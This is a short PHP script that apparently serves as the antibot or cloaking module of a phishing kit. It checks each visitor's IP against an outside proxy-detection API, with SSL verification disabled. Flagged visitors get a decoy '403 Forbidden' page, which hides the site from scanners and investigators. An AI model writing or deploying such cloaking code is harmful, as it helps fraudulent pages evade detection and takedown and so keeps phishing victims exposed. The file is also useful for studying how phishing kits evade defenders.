<?php
$tanitatikaram = parse_ini_file("config.ini", true);                                                   
$setting_proxy = $tanitatikaram['setting_proxy'];
if ($setting_proxy == 'on') {
	$ip = getenv("REMOTE_ADDR");
    if ($ip == "127.0.0.1") {
	} else {
		$url = "https://api.iptrooper.net/check/" . $ip;
    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $url);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	$resp = curl_exec($ch);
    	curl_close($ch);
    	$result = $resp;
    	if ($result == "1") {
    		header(require 'Antibot/AntibotProxyserver.php');
    	    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    	}
    }
}
